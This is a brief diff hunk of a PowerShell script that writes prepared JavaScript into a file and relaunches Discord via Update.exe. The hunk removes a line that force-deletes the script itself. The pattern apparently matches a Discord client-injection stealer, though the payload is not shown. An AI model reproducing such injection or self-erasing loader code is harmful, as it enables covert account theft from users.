@@ -38,5 +38,3 @@ if($f){
     [System.IO.File]::WriteAllText($f, $js_final)
     Start-Process "$env:LOCALAPPDATA\Discord\Update.exe" "-processStart Discord.exe"
 }
-
-Remove-Item $MyInvocation.MyCommand.Path -Force
